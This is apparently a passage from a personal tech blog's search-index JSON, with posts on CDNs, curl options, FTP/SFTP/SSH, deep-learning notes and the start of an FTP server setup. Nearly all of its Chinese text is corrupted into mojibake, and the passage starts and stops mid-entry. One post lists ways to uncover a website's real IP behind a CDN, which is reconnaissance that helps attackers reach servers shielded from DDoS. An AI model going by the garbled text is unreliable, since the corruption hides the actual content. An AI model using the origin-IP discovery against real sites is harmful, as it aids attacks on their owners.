Network)æ˜¯æŒ‡å†…å®¹åˆ†å‘ç½‘ç»œï¼Œä¹Ÿç§°ä¸ºå†…å®¹ä¼ é€ç½‘ç»œï¼Œè¿™ä¸ªæ¦‚å¿µå§‹äº1996å¹´ï¼Œæ˜¯ç¾å›½éº»çœç†å·¥å­¦é™¢çš„ä¸€ä¸ªç ”ç©¶å°ç»„ä¸ºæ”¹å–„äº’è”ç½‘çš„æœåŠ¡è´¨é‡è€Œæå‡ºçš„ã€‚ä¸ºäº†èƒ½åœ¨ä¼ ç»ŸIPç½‘ä¸Šå‘å¸ƒä¸°å¯Œçš„å®½å¸¦åª’ä½“å†…å®¹ï¼Œä»–ä»¬æå‡ºåœ¨ç°æœ‰äº’è”ç½‘åŸºç¡€ä¸Šå»ºç«‹ä¸€ä¸ªå†…å®¹åˆ†å‘å¹³å°ä¸“é—¨ä¸ºç½‘ç«™æä¾›æœåŠ¡ï¼Œå¹¶äº1999å¹´æˆç«‹äº†ä¸“é—¨çš„CDNæœåŠ¡å…¬å¸ï¼Œä¸ºYahooæä¾›ä¸“ä¸šæœåŠ¡ã€‚ç”±äºCDNæ˜¯ä¸ºåŠ å¿«ç½‘ç»œè®¿é—®é€Ÿåº¦è€Œè¢«ä¼˜åŒ–çš„ç½‘ç»œè¦†ç›–å±‚ï¼Œå› æ­¤è¢«å½¢è±¡åœ°ç§°ä¸ºâ€œç½‘ç»œåŠ é€Ÿå™¨â€ã€‚ ä»¥ä¸Šæ˜¯æ¥è‡ªç™¾åº¦ç™¾ç§‘çš„è§£é‡Šä¸ªäººç†è§£ï¼Œé€šä¿—ç‚¹è¯´ï¼Œcdnå…¶å®å°±æ˜¯ä¸€äº›æœåŠ¡å™¨ï¼Œå°†ä½ çš„ä¸€äº›é™æ€æ–‡ä»¶ï¼ˆhtmlï¼‰ä»€ä¹ˆçš„å¤åˆ¶ä¸€ä»½ï¼Œç„¶åç­‰æœ‰äººè®¿é—®ç½‘ç«™çš„æ—¶å€™å†å°±è¿‘é€‰æ‹©cdnæœåŠ¡å™¨æŠŠä½ çš„é‚£äº›é™æ€é¡µé¢è¿”å›ï¼Œè¿™æ ·å°±ä¸ç”¨é€šè¿‡ä½ çš„æœåŠ¡å™¨ï¼Œä»è€Œå‡è½»å¸¦å®½è´Ÿè½½äº† CDNå’ŒIPæ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿç”±äºç”¨æˆ·è·å–é™æ€æ–‡ä»¶æ—¶å¤§æ¦‚ç‡ä¼šç”±CDNæœåŠ¡å™¨è¿”å›ï¼Œåˆ™å¤§å¤šæ•°æƒ…å†µä¸‹ç”¨æˆ·è¾“å…¥åŸŸåè®¿é—®ç½‘ç«™æ—¶ï¼Œå®é™…è¿›è¡Œé€šä¿¡çš„å¾ˆå¯èƒ½ä¸æ˜¯è¯¥ç½‘ç«™çœŸå®çš„IPï¼Œè€Œæ˜¯CDNæœåŠ¡å™¨çš„IP CDNçš„å¥½å¤„æœ‰å“ªäº›ï¼Ÿæœ€æ˜æ˜¾çš„ä¹Ÿæ˜¯å¤§éƒ¨åˆ†äººæœ€éœ€è¦çš„ï¼Œå°±æ˜¯å‡å°‘è‡ªå®¶æœåŠ¡å™¨çš„å¸¦å®½è´Ÿè½½æ­¤å¤–è¿˜æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œå°±æ˜¯éšè—æœåŠ¡å™¨çš„çœŸå®IPï¼ˆä½†æ˜¯ä¸èƒ½ç™¾åˆ†ç™¾éšè—ï¼‰ CDNéšè—IPçš„å¥½å¤„æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆä¸èƒ½å®Œå…¨éšè—ï¼Ÿéšè—IPæœ€å¤§çš„å¥½å¤„å°±æ˜¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å…è‡ªå®¶æœåŠ¡å™¨å—åˆ°æ”»å‡»ï¼ˆDDoSæ”»å‡»ä¹‹ç±»çš„ï¼‰ï¼Œå› ä¸ºä¸æ³•åˆ†å­æ— æ³•çŸ¥é“æˆ‘ä»¬æœåŠ¡å™¨çš„çœŸå®IPï¼Œä¹Ÿå°±æ— æ³•å¯¹è¯¥IPè¿›è¡Œå¤§é‡é‡å¤çš„è¯·æ±‚ä»è€Œè¾¾åˆ°ä½¿ç½‘ç«™æ‹’ç»æœåŠ¡çš„æ•ˆæœï¼Œæœ€å¤šå°±æ˜¯æŠŠæœ€è¿‘çš„CDNæœåŠ¡å™¨æ‰“äº†ä¸‹æ¥é‚£å¤©ä¸‹CDNåƒåƒä¸‡ï¼Œä½ æŠŠè¿™ä¸ªæ‰“ä¸‹æ¥äº†åˆæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿä½ åˆä¸èƒ½ç¡®ä¿ä½ ä¸‹ä¸€ä¸ªè®¿é—®çš„æœåŠ¡å™¨ä¸€å®šä¸æ˜¯CDN æˆ‘æ€ä¹ˆçŸ¥é“è‡ªå·±çš„è¯·æ±‚æ˜¯ä¸æ˜¯åˆ°äº†CDNå‘¢ï¼Ÿæƒ³çŸ¥é“è‡ªå·±è®¿é—®çš„æœåŠ¡å™¨æ˜¯ä¸æ˜¯CDNï¼Œæœ‰å‡ ç§åŠæ³•ï¼šwindowså‘½ä»¤è¡Œç”¨nslookupå‘½ä»¤æŸ¥è¯¢ä¸€ä¸‹ç›®æ ‡åŸŸåï¼Œå¦‚æœä¸€ä¸ªåŸŸåå¯¹åº”ç€å¥½å‡ ä¸ªIPï¼Œé‚£åæœ‰å…«ä¹æ˜¯ä½¿ç”¨äº†CDNï¼›å½“ç„¶ï¼Œå¦‚æœåªè¿”å›äº†ä¸€ä¸ªIPä¹Ÿä¸èƒ½è¯´æ˜ç›®æ ‡ç½‘ç«™å°±æ²¡æœ‰ä½¿ç”¨CDNåœ¨CDNæŸ¥è¯¢ç½‘ç«™ä¸ŠæŸ¥ http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/ æŸ¥å­åŸŸåï¼šå› ä¸ºå¤§éƒ¨åˆ†ç«™é•¿ä½¿ç”¨CDNé’ˆå¯¹çš„å¤§å¤šæ˜¯é¦–é¡µç­‰è®¿é—®é‡æ¯”è¾ƒå¤§çš„é¡µé¢ï¼Œé‚£ä¹ˆå­é¡µé¢å°±æœ‰å¯èƒ½æ²¡æœ‰ä½¿ç”¨CDNï¼Œè¿™æ—¶å€™æŸ¥è¯¢å­é¡µé¢è¿”å›çš„ç»“æœå¾ˆæœ‰å¯èƒ½å°±æ˜¯çœŸå®IPæ¼æ´åˆ©ç”¨ï¼šç”¨CTFé‚£å¥—è¯•è¯•ã€‚ä¸è¿‡ä¸æå€¡ä¸”å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä¸åˆæ³•åˆ†ææœåŠ¡å™¨è¿”å›çš„ä¿¡æ¯ï¼šæœ‰äº›ç½‘ç«™ä¼šæœ‰é‚®ä»¶æœåŠ¡æˆ–è€…è®¢é˜…æœåŠ¡ä¹‹ç±»çš„ï¼Œè€Œè¿™äº›æœåŠ¡æœ‰æ—¶å¹¶ä¸ä¼šä½¿ç”¨CDNï¼Œé€šè¿‡åˆ†æé‚®ä»¶æºç å°±å¯ä»¥å¾—åˆ°IPé€šè¿‡å›½å¤–è®¿é—®ï¼šæœ‰äº›CDNåªé¢å‘å›½å†…çš„è¯·æ±‚ï¼Œå¯¹äºä¸åœ¨æœåŠ¡èŒƒå›´çš„å›½å¤–è¯·æ±‚æœ‰å¯èƒ½ä¸ä¼šç»è¿‡CDNè€Œç›´æ¥è®¿é—®çœŸå®IPç›´æ¥è®¿é—®CDNæœåŠ¡å™¨ï¼šæœ€ç›´æ¥çš„æ–¹æ³•å°±æ˜¯æ‹¿åˆ°CDNæœåŠ¡å™¨çš„è´¦æˆ·è‡ªå·±ä¸Šå»æŸ¥ æ€æ ·æ‰èƒ½æœ‰CDNæœåŠ¡ï¼Ÿé™¤äº†èŠ±é’±ä¹°è¿™ä¸€æœ€ç›´æ¥çš„æ–¹æ³•ä¹‹å¤–ï¼Œè¿˜æœ‰å¦å¤–ä¸€ç§èƒ½å¤Ÿè·å¾—CDNæœåŠ¡çš„æ–¹æ³•ï¼Œå°±æ˜¯åœ¨ç§ŸèµåŸŸåçš„æ—¶å€™å¾ˆå¤šæœåŠ¡æä¾›å•†ä¼šå…è´¹å¯¹è¯¥åŸŸåæä¾›CDNæœåŠ¡ï¼Œä¸è¦ç™½ä¸è¦ ä»¥ä¸‹æ˜¯å¯¹æˆ‘è‡ªå·±ç½‘ç«™çš„CDNæŸ¥è¯¢ æœ€åå†è¯´ä¸€å¥ï¼Œæ‹¿åˆ°çœŸå®IPäº†ä¹Ÿæœªå¿…èƒ½å¤Ÿé€šè¿‡IPè®¿é—®ç›®æ ‡ç½‘ç«™ quotehttps://blog.csdn.net/fly_hps/article/details/98486807https://www.cxybb.com/article/weixin_37104668/115167764https://baike.baidu.com/item/CDN/420951","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"curlçš„å¸¸è§ç”¨æ³•","slug":"curl","date":"2022-03-12T12:22:27.696Z","updated":"2022-03-12T12:52:54.139Z","comments":true,"path":"2022/03/12/curl/","link":"","permalink":"http://uniqueland.top/2022/03/12/curl/","excerpt":"curlç”¨æ³•ï¼š","text":"curlç”¨æ³•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839GETè¯·æ±‚ï¼šcurl https://www.xxx.comPOSTè¯·æ±‚ï¼šcurl -d key=value https://www.xxx.comå¡«å†™è¡¨å•ï¼šcurl -F key1=value1 -F key2=value2 https://www.xxx.com/xxx.cgiæ˜¾ç¤ºä¿¡æ¯ï¼šcurl -i https://www.xxx.comæŒ‡å®šUSER-AGENTcurl -A &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39&quot; https://www.xxx.comæ³¨ï¼šè‹¥ç•™ç©ºåˆ™ç§»é™¤User-Agentæ ‡å¤´è·Ÿéšé‡å®šå‘ï¼šcurl -L https://www.xxx.comæ³¨ï¼šcurlé»˜è®¤ä¸è·Ÿéšé‡å®šå‘å‘é€cookieï¼šcurl -b &quot;foo=bar&quot; https://www.xxx.comurlç¼–ç ï¼šcurl --data-urlencode &quot;xxxxxxx&quot; https://www.xxx.comæ³¨ï¼šè¯¥æ–¹å¼ä¸-dç›¸è¿‘ï¼ŒåŒºåˆ«åœ¨äºæ˜¯å¦ç¼–ç ä¿å­˜ç½‘é¡µ(ä¸wgetç›¸ä¼¼)ï¼šcurl -o xxx.html https://www.xxx.comç”¨æˆ·è®¤è¯ï¼šcurl -u &quot;user:passwd&quot; https://www.xxx.com/loginè¾“å‡ºé€šä¿¡è¿‡ç¨‹ï¼šcurl -v https://www.xxx.comè¾“å‡ºäºŒè¿›åˆ¶æ•°æ®ï¼šcurl --trace - https://www.xxx.comæ³¨ï¼šå¯é…åˆ-oå¯¼å‡º quotehttps://www.jianshu.com/p/fc0eb6c60816https://www.ruanyifeng.com/blog/2019/09/curl-reference.html","categories":[],"tags":[{"name":"tool","slug":"tool","permalink":"http://uniqueland.top/tags/tool/"}]},{"title":"ftp,sftpä¸sshä¹‹é—´çš„å…³ç³»","slug":"ftp_sftp_ssh","date":"2022-03-06T03:27:06.551Z","updated":"2022-03-06T05:24:37.416Z","comments":true,"path":"2022/03/06/ftp_sftp_ssh/","link":"","permalink":"http://uniqueland.top/2022/03/06/ftp_sftp_ssh/","excerpt":"ftpå’Œsftpçš„åŒºåˆ«è¿™ä¸¤ç§åè®®éƒ½æ˜¯ç”¨äºä¼ è¾“æ–‡ä»¶çš„ï¼Œå…¶ä¸­sftpæ˜¯åŸºäºsshçš„åŸç†","text":"ftpå’Œsftpçš„åŒºåˆ«è¿™ä¸¤ç§åè®®éƒ½æ˜¯ç”¨äºä¼ è¾“æ–‡ä»¶çš„ï¼Œå…¶ä¸­sftpæ˜¯åŸºäºsshçš„åŸç†å¼€å‘çš„ ftp: File Transfer Protocolstfp: Secure File Transfer Protocol / SSH File Transfer Protocolssh: Secure Shell ftpftpæ˜¯æ˜æ–‡ä¼ è¾“ï¼Œæœ‰ä¸¤ç§æ¨¡å¼ï¼šä¸»åŠ¨æ¨¡å¼å’Œè¢«åŠ¨æ¨¡å¼ ä¸»åŠ¨æ¨¡å¼(Positive Mode)ï¼šåœ¨è¯¥æ¨¡å¼ä¸‹ï¼ŒæœåŠ¡ç«¯å¼€æ”¾21ï¼Œ20ç«¯å£ï¼›21ç«¯å£ç”¨äºæ¥æ”¶ç”¨æˆ·åå’Œå¯†ç ï¼Œ20ç«¯å£ç”¨äºä¼ è¾“æ•°æ®å®¢æˆ·ç«¯ç™»å½•ftpæœåŠ¡å™¨åéšæœºå¼€æ”¾ä¸€ä¸ªç«¯å£ï¼Œå†å°†è¿™ä¸ªç«¯å£çš„ä¿¡æ¯å‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å†é€šè¿‡ç”¨äºä¼ è¾“æ•°æ®çš„20ç«¯å£è¿æ¥è‡³ç”¨æˆ·æä¾›çš„ç«¯å£ è¢«åŠ¨æ¨¡å¼(Passive Mode)ï¼šåœ¨è¯¥æ¨¡å¼ä¸‹ï¼ŒæœåŠ¡ç«¯å¼€æ”¾ç”¨äºå®¢æˆ·ç«¯è¿æ¥çš„21ç«¯å£ä»¥åŠä¸€ä¸ªéšæœºç«¯å£ï¼Œè€Œå®¢æˆ·ç«¯åœ¨ç™»å½•ftpæœåŠ¡å™¨åæ¥æ”¶æœåŠ¡ç«¯æä¾›çš„éšæœºç«¯å£çš„ä¿¡æ¯ï¼Œå†è¿æ¥è‡³æœåŠ¡ç«¯çš„è¯¥ç«¯å£ä»¥ä¼ è¾“æ•°æ® stfp é¦–å…ˆè¦æ˜ç¡®çš„ä¸€ç‚¹æ˜¯ï¼Œstfpæ˜¯sshçš„ä¸€ä¸ªå­æœåŠ¡ sftpæ˜¯åŸºäºsshçš„æŠ€æœ¯è¿›è¡Œæ–‡ä»¶çš„ä¼ è¾“çš„ï¼Œè€Œsshæ˜¯é€šè¿‡22ç«¯å£è¿›è¡Œé€šä¿¡çš„ï¼Œä¹Ÿå°±æ˜¯è¯´sftpä¹Ÿæ˜¯é€šè¿‡22ç«¯å£è¿›è¡Œé€šä¿¡ä»¥åŠæ•°æ®ä¼ è¾“çš„ï¼Œä¸ftpåè®®ç›¸æ¯”ï¼Œé™¤äº†é€šä¿¡ç«¯å£çš„ä¸åŒï¼Œç”±äºsshçš„é€šä¿¡è¿‡ç¨‹æ˜¯åŠ å¯†çš„ï¼Œæ‰€ä»¥sftpä¸­æ–‡ä»¶çš„ä¼ è¾“ä¹Ÿæ˜¯åŠ å¯†çš„ï¼Œä½†å®é™…çš„å®‰å…¨æ€§è¿˜å–å†³äºsshçš„è¿æ¥æ–¹å¼ï¼›ä¸”åœ¨sshæœåŠ¡å™¨ä¸é€šä¿¡ä¸»æœºï¼ˆæœåŠ¡å™¨ï¼‰åˆ†å¼€æ—¶è¿˜åˆ†æœ‰åŠå®‰å…¨æ¨¡å¼(Less Secure Connection)å’Œå®‰å…¨æ¨¡å¼(Full Secure Connection) åŠå®‰å…¨æ¨¡å¼æŒ‡ç”¨æˆ·é€šè¿‡sshè¿æ¥sshæœåŠ¡å™¨æ—¶æ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯åŠ å¯†çš„ï¼Œè€ŒsshæœåŠ¡å™¨ä¸ä¸»æœºé—´é€šä¿¡çš„æ•°æ®æ˜¯æœªåŠ å¯†çš„ å®‰å…¨æ¨¡å¼æŒ‡ç”¨æˆ·ä¸sshæœåŠ¡å™¨ä»¥åŠsshæœåŠ¡å™¨ä¸ä¸»æœºé—´çš„é€šä¿¡éƒ½æ˜¯åŠ å¯†çš„ è€Œå½“sshæœåŠ¡è¿è¡Œäºç›®æ ‡ä¸»æœºä¸Šæ—¶ä¾¿ä¸å­˜åœ¨åŠå®‰å…¨æ¨¡å¼å’Œå®‰å…¨æ¨¡å¼ä¹‹åˆ†äº† sshä½œä¸ºè¿œç¨‹è¿æ¥ä¸»æœºçš„å¸¸ç”¨æ–¹å¼ï¼Œsshæœ‰ä¸¤ç§è¿æ¥æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œé€šä¿¡ï¼Œè¿™ç§æ–¹å¼éå¸¸æ–¹ä¾¿ï¼Œåªéœ€è¦ä»»æ„ä¸€å°èƒ½å¤Ÿæ¥å…¥äº’è”ç½‘çš„å¸¸ç”¨è®¾å¤‡å°±èƒ½å¤Ÿè¿æ¥ä¸Šè¿œç¨‹ä¸»æœºï¼Œä½†æ˜¯è¿™ç§æ–¹å¼å­˜åœ¨å—åˆ°ä¸­é—´äººæ”»å‡»çš„å¯èƒ½ï¼›å¦ä¸€ç§æ–¹å¼æ˜¯é€šè¿‡å¯†é’¥åˆ†å‘çš„æ–¹å¼ï¼Œå³åœ¨æœåŠ¡ç«¯ç”Ÿæˆä¸€ä»½ç§é’¥å­˜äºæœåŠ¡å™¨ï¼Œå†ç”Ÿæˆä¸€ä»½å…¬é’¥åˆ†å‘ç»™éœ€è¦é€šä¿¡çš„ä¸»æœºï¼Œè¿™ç§æ–¹å¼ä¸éœ€è¦ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä¸”é€šä¿¡æ—¶éœ€è¦è¿›è¡Œå¯†é’¥ä¸å…¬é’¥çš„éªŒè¯ï¼ŒåŸºæœ¬æœç»äº†ä¸­é—´äººæ”»å‡»çš„å¯èƒ½ï¼Œä½†æ˜¯ç”±äºéœ€è¦æå‰å‡†å¤‡å¥½å…¬é’¥ï¼Œæ•…ä¾¿æºæ€§ä¸å¦‚ç¬¬ä¸€ç§æ–¹å¼ quotehttps://network.51cto.com/article/603552.htmlhttps://www.zhihu.com/question/20402010https://blog.csdn.net/cuker919/article/details/6403925","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"Deep Learning from Scratch 5","slug":"deep_learning_from_scratch_5","date":"2021-12-25T08:05:51.980Z","updated":"2021-12-25T08:44:21.959Z","comments":true,"path":"2021/12/25/deep_learning_from_scratch_5/","link":"","permalink":"http://uniqueland.top/2021/12/25/deep_learning_from_scratch_5/","excerpt":"æ·±åº¦å­¦ä¹ åº”ç”¨æ¡ˆä¾‹","text":"æ·±åº¦å­¦ä¹ åº”ç”¨æ¡ˆä¾‹ ç‰©ä½“æ£€æµ‹ â€“ R-CNN å›¾åƒåˆ†å‰² â€“ FCN å›¾åƒæ ‡é¢˜çš„ç”Ÿæˆ â€“ NIC (CNN+RNN) å›¾åƒé£æ ¼å˜æ¢ å›¾åƒçš„ç”Ÿæˆ â€“ DCGAN è‡ªåŠ¨é©¾é©¶ Dep Q-Network (å¼ºåŒ–å­¦ä¹ ) å¤šæ¨¡æ€å¤„ç† ç»„åˆå›¾åƒå’Œè‡ªç„¶è¯­è¨€ç­‰å¤šç§ä¿¡æ¯è¿›è¡Œçš„å¤„ç† GAN ç”Ÿæˆå¼å¯¹æŠ—ç½‘ç»œï¼ˆGAN, Generative Adversarial Networks ï¼‰æ˜¯ä¸€ç§æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼Œæ˜¯è¿‘å¹´æ¥å¤æ‚åˆ†å¸ƒä¸Šæ— ç›‘ç£å­¦ä¹ æœ€å…·å‰æ™¯çš„æ–¹æ³•ä¹‹ä¸€ã€‚æ¨¡å‹é€šè¿‡æ¡†æ¶ä¸­ï¼ˆè‡³å°‘ï¼‰ä¸¤ä¸ªæ¨¡å—ï¼šç”Ÿæˆæ¨¡å‹ï¼ˆGenerative Modelï¼‰å’Œåˆ¤åˆ«æ¨¡å‹ï¼ˆDiscriminative Modelï¼‰çš„äº’ç›¸åšå¼ˆå­¦ä¹ äº§ç”Ÿç›¸å½“å¥½çš„è¾“å‡ºã€‚åŸå§‹ GAN ç†è®ºä¸­ï¼Œå¹¶ä¸è¦æ±‚ G å’Œ D éƒ½æ˜¯ç¥ç»ç½‘ç»œï¼Œåªéœ€è¦æ˜¯èƒ½æ‹Ÿåˆç›¸åº”ç”Ÿæˆå’Œåˆ¤åˆ«çš„å‡½æ•°å³å¯ã€‚ä½†å®ç”¨ä¸­ä¸€èˆ¬å‡ä½¿ç”¨æ·±åº¦ç¥ç»ç½‘ç»œä½œä¸º G å’Œ D ã€‚ â€“Baidu Baike","categories":[],"tags":[{"name":"çŸ¥è¯†è¾“å‡ºã€AI","slug":"çŸ¥è¯†è¾“å‡ºã€AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"Deep Learning from Scratch 4","slug":"deep_learning_from_scratch_4","date":"2021-12-18T13:14:56.550Z","updated":"2021-12-19T03:18:49.592Z","comments":true,"path":"2021/12/18/deep_learning_from_scratch_4/","link":"","permalink":"http://uniqueland.top/2021/12/18/deep_learning_from_scratch_4/","excerpt":"å·ç§¯ç¥ç»ç½‘ç»œä¸æ™®é€šæœºå™¨å­¦ä¹ çš„åŒºåˆ«","text":"å·ç§¯ç¥ç»ç½‘ç»œä¸æ™®é€šæœºå™¨å­¦ä¹ çš„åŒºåˆ« CNNä¸­æ–°å‡ºç°äº†å·ç§¯å±‚å’Œæ± åŒ–å±‚ å…¨è¿æ¥å±‚å­˜åœ¨çš„é—®é¢˜åœ¨å…¨è¿æ¥å±‚ä¸­ï¼Œä¼ å…¥çš„å›¾åƒçš„å½¢çŠ¶ä¿¡æ¯è¢«ç ´åäº†ï¼›ç”±äºåœ¨å…¨è¿æ¥å±‚ä¸­ï¼Œæ•°æ®æ˜¯ä»¥ä¸€ç»´çš„å½¢å¼ä¼ å…¥çš„ï¼Œæ•…å¿½ç•¥äº†å›¾åƒä¸­è¯¸å¦‚ç›¸é‚»åƒç´ ä¹‹é—´çš„å…³ç³» ç‰¹å¾å›¾å·ç§¯å±‚çš„è¾“å…¥è¾“å‡ºæ•°æ®ã€‚æ ¹æ®è¾“å…¥å’Œè¾“å‡ºåˆ†ä¸ºè¾“å…¥ç‰¹å¾å›¾å’Œè¾“å‡ºç‰¹å¾å›¾ å·ç§¯è¿ç®—å·ç§¯è¿ç®—æ˜¯ä»¥ä¸€å®šçš„é—´éš”æ»‘åŠ¨æ»¤æ³¢å™¨çš„çª—å£å¹¶å¯¹è¾“å…¥æ•°æ®åº”ç”¨æ»¤æ³¢å™¨ï¼Œåº”ç”¨çš„æ–¹å¼æœ‰ä¹˜ç§¯ç´¯åŠ ï¼Œåç½®å’Œæ±‚å’Œç­‰ å¡«å……å‘è¾“å…¥æ•°æ®çš„å‘¨å›´å¡«å…¥å›ºå®šçš„æ•°å€¼ï¼›â€œå¹…åº¦ä¸º1çš„å¡«å……â€æŒ‡çš„æ˜¯å‘è¾“å…¥æ•°æ®å‘¨å›´1ä¸ªå•ä½çš„èŒƒå›´å†…å¡«å……0 ä½œç”¨ï¼šè°ƒæ•´è¾“å‡ºçš„å¤§å°ï¼Œç”±äºåœ¨å·ç§¯è¿ç®—ä¸­ç©ºé—´ä¸æ–­ç¼©å°ï¼Œä¸ºäº†åœ¨ä¿æŒè¾“å‡ºå¤§å°ä¸å˜çš„å‰æä¸‹è¿›è¡Œå·ç§¯è¿ç®—ç”šè‡³æ·±åº¦å·ç§¯ï¼Œå°±éœ€è¦å¡«å……æ¥è°ƒæ•´æ•°æ®ç©ºé—´å¤§å° æ­¥å¹… åº”ç”¨æ»¤æ³¢å™¨çš„ä½ç½®é—´éš” 3ç»´æ•°æ®çš„å·ç§¯è¿ç®—ä¸2ç»´æ•°æ®çš„å·ç§¯è¿ç®—ä¸åŒçš„æ˜¯ï¼Œ3ç»´æ•°æ®çš„å·ç§¯è¿ç®—åŒæ—¶è¿›è¡Œå¤šé€šé“çš„å·ç§¯å¹¶å°†ç»“æœç›¸åŠ  æ± åŒ–å±‚æ± åŒ–æ˜¯ç¼©å°é«˜ã€é•¿æ–¹å‘ä¸Šçš„ç©ºé—´çš„è¿ç®—ï¼›åŒ…å«Maxæ± åŒ–å’ŒAverageæ± åŒ–ç­‰ ç‰¹å¾ æ²¡æœ‰è¦å­¦ä¹ çš„å‚æ•° é€šé“æ•°ä¸å‘ç”Ÿå˜åŒ– å¯¹å¾®å°çš„ä½ç½®å˜åŒ–å…·æœ‰é²æ£’æ€§ï¼ˆå¥å£®ï¼‰ å…·æœ‰ä»£è¡¨æ€§çš„CNN LeNet æ˜¯è¿›è¡Œæ‰‹å†™æ•°å­—è¯†åˆ«çš„ç½‘ç»œï¼Œå…·æœ‰è¿ç»­çš„å·ç§¯å±‚å’Œæ± åŒ–å±‚ï¼Œæœ€åç»å…¨è¿æ¥å±‚è¾“å‡ºç»“æœ ä¸åŒç‚¹ æ¿€æ´»å‡½æ•°ä¸åŒ LeNetä½¿ç”¨sigmoidå‡½æ•°ï¼Œè€Œç°åœ¨çš„CNNä¸»è¦ä½¿ç”¨ReLUå‡½æ•° åœ¨ç¼©å°ä¸­é—´æ•°æ®çš„å¤§å°æ—¶é‡‡ç”¨çš„æ–¹æ³•ä¸åŒ åŸå§‹çš„LeNetä¸­ä½¿ç”¨å­é‡‡æ ·(subsampling)ï¼Œè€Œç°åœ¨çš„CNNå¤§å¤šä½¿ç”¨Maxæ± åŒ– AlexNet åœ¨ç»“æ„ä¸Šä¸LeNetåŸºæœ¬æ²¡æœ‰ä»€ä¹ˆä¸åŒ ä¸LeNetçš„å·®å¼‚ æ¿€æ´»å‡½æ•°ä½¿ç”¨ReLU ä½¿ç”¨è¿›è¡Œå±€éƒ¨æ­£è§„åŒ–çš„LRN(Local Response Normalization)å±‚ ä½¿ç”¨Dropout Data Augmentation(æ•°æ®æ‰©å……)åŸºäºç®—æ³•â€œäººä¸ºåœ°â€æ‰©å……è¾“å…¥å›¾åƒï¼ˆè®­ç»ƒå›¾åƒï¼‰ï¼Œå¦‚æ–½åŠ æ—‹è½¬ã€å‚ç›´æˆ–æ°´å¹³æ–¹å‘ä¸Šçš„ç§»åŠ¨ç­‰å¾®å°å˜åŒ–ï¼Œä»¥æ­¤å¢åŠ å›¾åƒçš„æ•°é‡ åŠ æ·±å±‚çš„å¥½å¤„ å‡å°‘ç½‘ç»œçš„å‚æ•°æ•°é‡ ä¸æ²¡æœ‰åŠ æ·±å±‚çš„ç½‘ç»œç›¸æ¯”ï¼ŒåŠ æ·±äº†å±‚çš„ç½‘ç»œå¯ä»¥ç”¨æ›´å°‘çš„å‚æ•°è¾¾åˆ°åŒç­‰æ°´å¹³ï¼ˆæˆ–è€…æ›´å¼ºï¼‰çš„è¡¨ç°åŠ› ä½¿å­¦ä¹ æ›´åŠ é«˜æ•ˆ éšç€å±‚çš„åŠ æ·±ï¼Œç¥ç»å…ƒä¼šå¯¹æ›´å¤æ‚çš„ä¸œè¥¿æœ‰å“åº” å¯ä»¥åˆ†å±‚æ¬¡åœ°åˆ†è§£éœ€è¦å­¦ä¹ çš„é—®é¢˜ å¯ä»¥åˆ†å±‚æ¬¡åœ°ä¼ é€’ä¿¡æ¯ æ„Ÿå—é‡(receptive field)ç»™ç¥ç»å…ƒæ–½åŠ å˜åŒ–çš„æŸä¸ªå±€éƒ¨ç©ºé—´åŒºåŸŸ ImageNetä¸€ä¸ªæ‹¥æœ‰è¶…è¿‡100ä¸‡å¼ å›¾åƒçš„æ•°æ®é›† åœ¨æ·±åº¦å­¦ä¹ ä¸­æ¯”è¾ƒçŸ¥åçš„ç½‘ç»œ VGG GoogLeNet ResNet æ·±åº¦å­¦ä¹ ä¸­é«˜é€ŸåŒ–çš„é—®é¢˜åœ¨æ·±åº¦å­¦ä¹ ä¸­å¤§éƒ¨åˆ†æ—¶é—´éƒ½è€—è´¹åœ¨å·ç§¯å±‚ä¸Š åŸºäºGPUçš„é«˜é€ŸåŒ–æ·±åº¦å­¦ä¹ ä¸­éœ€è¦è¿›è¡Œå¤§é‡çš„ä¹˜ç§¯ç´¯åŠ è®¡ç®—ï¼Œè€Œè¿™æ­£æ˜¯GPUæ‰€æ“…é•¿çš„ï¼Œæ•…å¯ä½¿ç”¨GPUæ¥è¿›è¡Œæ·±åº¦å­¦ä¹ çš„è¿ç®—ä»¥æé«˜å­¦ä¹ é€Ÿåº¦ åˆ†å¸ƒå¼å­¦ä¹ ä¸ºäº†è¿›ä¸€æ­¥æé«˜æ·±åº¦å­¦ä¹ æ‰€éœ€çš„è®¡ç®—çš„é€Ÿåº¦ï¼Œå¯ä»¥è€ƒè™‘åœ¨å¤šä¸ªGPUæˆ–è€…å¤šå°æœºå™¨ä¸Šè¿›è¡Œåˆ†å¸ƒå¼è®¡ç®—","categories":[],"tags":[{"name":"çŸ¥è¯†è¾“å‡ºã€AI","slug":"çŸ¥è¯†è¾“å‡ºã€AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"ftpæ–‡ä»¶æœåŠ¡å™¨æ­å»º","slug":"ftp_server","date":"2021-12-16T15:03:06.120Z","updated":"2021-12-16T15:15:51.555Z","comments":true,"path":"2021/12/16/ftp_server/","link":"","permalink":"http://uniqueland.top/2021/12/16/ftp_server/","excerpt":"ç¬¬ä¸€æ­¥ï¼šæ›´æ–°è½¯ä»¶åˆ—è¡¨","text":"ç¬¬ä¸€æ­¥ï¼šæ›´æ–°è½¯ä»¶åˆ—è¡¨ 1234567891011121314zh@ubuntu:~$ sudo apt update[sudo] password for zh: Hit:1 http://cn.archive.ubuntu.com/ubuntu focal 